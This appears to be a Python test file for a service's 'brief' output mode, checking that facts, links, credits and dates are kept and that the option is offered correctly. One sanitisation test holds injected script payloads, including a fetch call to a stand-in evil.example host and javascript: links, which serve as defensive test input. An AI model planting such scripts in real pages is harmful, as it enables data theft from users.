"""detail=brief (PM 11-17): the same facts, values and links in fewer tokens; credits kept once per source; no markup
or script comes back to life; a response option only (default full; the definition and the runner unchanged)."""
import json
import re
from pathlib import Path

from agent_market.necklaces import brief as b
from agent_market.necklaces import limits, runner
from tests.test_necklaces_service import call

OUTPUT = {
    "background": {"answers": [{"text": json.dumps([{"title": "Southwest Gas", "excerpt":
        "<span class=\"searchmatch\">Southwest</span> Gas Holdings, Inc. (NYSE: SWX) is a utility",
        "url": "https://en.wikipedia.org/wiki/Southwest_Gas"}]), "urls": []}],
                   "material": b.NOTICE, "sources": ["external:241601"]},
    "filings": {"answers": [{"text": "{\"answer\": \"2026-11-04 10-Q (accession 0001692115-26-000123)\"}",
                             "attribution": {"sources": [{"name": "SEC EDGAR", "url": "https://www.sec.gov/edgar",
                                                          "license": "U.S. Government public data", "notice": "Not endorsed"}],
                                             "freshness": {"data_as_of": {"SEC EDGAR": "2026-11-04"}},
                                             "cache": {"status": "live"}}}],
                "material": b.NOTICE, "sources": ["agentcon:sec-filings"]},
    "domain": {"missing": True},
}


def test_facts_values_and_links_are_kept_and_the_notice_appears_once():
    out = b.brief(OUTPUT)
    text = json.dumps(out)
    assert "0001692115-26-000123" in text and "NYSE: SWX" in text and "2026-11-04" in text
    assert "https://en.wikipedia.org/wiki/Southwest_Gas" not in out["steps"]["background"]["answer"]   # a link, not prose
    assert out["steps"]["filings"]["links"] == ["https://www.sec.gov/edgar"] and out["steps"]["filings"]["as_of"] == "2026-11-04"
    assert out["not_answered"] == ["domain"] and text.count(b.NOTICE) == 1
    assert "searchmatch" not in text and "cache" not in text
    assert len(json.dumps(out)) < len(json.dumps(OUTPUT))


def test_credits_are_kept_once_per_source():
    out = b.brief({**OUTPUT, "filings2": OUTPUT["filings"]})
    names = [c["name"] for c in out["credits"]]
    assert names.count("SEC EDGAR") == 1 and "U.S. Government public data" in json.dumps(out["credits"])
    assert b.EXTERNAL_CREDITS["241601"] in names                           # Wikipedia text through member 241601


def test_every_member_whose_terms_ask_for_attribution_has_a_credit():
    terms = json.loads(Path("agent_market/necklaces/member_terms.json").read_text())
    rows = terms.get("members") if "members" in terms else terms
    ask = re.compile(r"attribut|credit|cc[- ]?by", re.I)
    # 11-18: only members a necklace runs (definitions and drafts); a basis that says "credits" or "attribution" in
    # another sense is listed with its reason in brief.CREDIT_NOT_REQUIRED
    used = {str(m.get("resource_id")) for f in [*Path("agent_market/necklaces/definitions").glob("*.json"),
                                               *Path("agent_market/necklaces/drafts").glob("*.json")]
            for s in json.loads(f.read_text()).get("slots") or [] for m in s.get("chain") or [] if m.get("resource_id")}
    need = {k for k, v in rows.items() if isinstance(v, dict) and v.get("status") in ("allowed", "silent")
            and ask.search(v.get("basis", "")) and not k.startswith("agent:") and k in used}
    assert need - set(b.CREDIT_NOT_REQUIRED) <= set(b.EXTERNAL_CREDITS), sorted(need - set(b.EXTERNAL_CREDITS))
    assert all(reason for reason in b.CREDIT_NOT_REQUIRED.values())


def test_scripts_hidden_blocks_and_unsafe_links_never_come_back():
    nasty = {"x": {"answers": [{"text": "ok <script>fetch('https://evil.example/?k=1')</script> &lt;script&gt;alert(1)"
                                        "&lt;/script&gt; <style>p{}</style> see javascript:alert(1) "
                                        "data:text/html,<b>x</b> https://good.example/a",
                                "urls": ["javascript:alert(2)", "https://good.example/b"]}]}}
    out = b.brief(nasty)
    text = json.dumps(out)
    assert "script" not in text.lower() and "evil.example" not in text and "<" not in out["steps"]["x"]["answer"]
    assert out["steps"]["x"]["links"] == ["https://good.example/a", "https://good.example/b"]


def test_absence_and_skipped_steps_keep_their_sources_and_time():
    out = b.brief({"registry": {"not_found": True, "sources": ["SEC EDGAR (companies with a ticker)"],
                                "checked_at": "2026-11-19 05:10 UTC", "note": "No record found in SEC EDGAR (companies "
                                "with a ticker) as of 2026-11-19 05:10 UTC."},
                   "filings": {"skipped": True, "note": runner.UPSTREAM_ABSENT_NOTE}})
    assert out["steps"]["registry"]["as_of"] == "2026-11-19 05:10 UTC" and "No record found" in out["steps"]["registry"]["answer"]
    assert out["steps"]["filings"]["answer"] == runner.UPSTREAM_ABSENT_NOTE


def test_the_service_option_default_full_brief_on_request_and_bad_values_refused(tmp_path):
    full = call(tmp_path, {"q": "lodash"})
    limits.reset()
    short = call(tmp_path, {"q": "lodash", "detail": "brief"})
    assert full["detail"] == "full" and "steps" not in full["output"]
    assert short["ok"] and short["detail"] == "brief" and short["output"]["detail"] == "brief"
    assert short["stages"] == full["stages"] and short["statuses"] == full["statuses"]       # status fields unchanged
    assert call(tmp_path, {"q": "lodash", "detail": "tiny"})["error_code"] == "invalid_input"


def test_the_runner_never_reads_brief_text():
    source = Path(runner.__file__).read_text()
    assert "brief" not in source.split("def merge(")[1].split("# ---------------------------------------------------------------- runner")[0]
    assert "from .brief" not in source and "import brief" not in source


def test_mcp_tools_offer_detail_and_still_no_ads_opt_out():
    from agent_market.concierge import necklace_surface as ns
    schema = ns.with_detail({"type": "object", "properties": {"q": {"type": "string"}}, "required": ["q"],
                             "additionalProperties": False})
    assert schema["properties"]["detail"]["enum"] == ["full", "brief"] and schema["required"] == ["q"]
    assert "ads" not in schema["properties"]
